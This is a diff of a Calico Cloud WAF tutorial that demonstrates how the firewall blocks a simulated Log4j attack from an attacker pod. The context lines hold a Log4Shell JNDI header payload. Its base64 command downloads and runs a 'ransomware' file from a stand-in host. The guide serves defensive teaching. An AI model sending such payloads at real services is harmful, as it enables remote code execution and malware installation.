@@ -15,6 +15,7 @@ Calico Cloud WAF allows you to selectively run service traffic within your clust
    ```bash
    kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash
    ```
+
 3. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.
 
    ```bash
@@ -25,7 +26,7 @@ Calico Cloud WAF allows you to selectively run service traffic within your clust
 
 4. Now enable the WAF using the following command from your shell (not from the pod attacker).
 
-   ```
+   ```bash
    kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
    ```
 
@@ -36,10 +37,10 @@ Calico Cloud WAF allows you to selectively run service traffic within your clust
      'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
      'vote.vote'
    ```
-   
+
    You will note that the result will be an HTTP 403 - Forbidden. This reponse returns from the WAF.
 
---- 
+---
 
 [:arrow_right: Module 4 - Zero-Day Attacks Detection with Threat Defence](/mod/module-4-threat-defence.md)  <br>
 
